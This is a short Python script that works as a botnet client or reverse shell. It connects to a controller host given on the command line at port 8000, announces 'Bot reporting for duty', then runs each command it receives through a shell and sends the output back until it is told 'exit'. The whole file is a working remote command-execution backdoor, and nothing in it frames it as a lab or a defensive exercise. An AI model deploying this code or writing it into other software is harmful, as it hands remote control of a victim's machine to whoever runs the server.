import sys
from subprocess import Popen, PIPE
from socket import *
import struct

def recvcall(sock, n):
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def send_msg(sock, payload: bytes):
    sock.sendall(struct.pack('!I', len(payload)) + payload)

def recv_msg(sock):
    hdr = recvcall(sock, 4)
    if not hdr:
        return None
    length = struct.unpack('!I', hdr)[0]
    if length == 0:
        return b''
    return recvcall(sock, length)

serverName = sys.argv[1]
serverPort = 8000

# Create IPv4(AF_INET), TCP Socket(SOCK_STREAM)
sock = socket(AF_INET, SOCK_STREAM)
sock.connect((serverName, serverPort))

# Send handshake message
send_msg(sock, b'Bot reporting for duty')

# Receive first command
msg = recv_msg(sock)

if msg is None:
    sock.close()
    sys.exit(0)

command = msg.decode(errors='replace')

while command != "exit":
    # Note: non-interactive commands must be passed
    proc = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    out, err = proc.communicate()

    # Send command output or error
    payload = out if out else err
    send_msg(sock, payload)

    # Wait for next command
    msg = recv_msg(sock)
    if msg is None:
        break
    command = msg.decode(errors='replace')

sock.close()
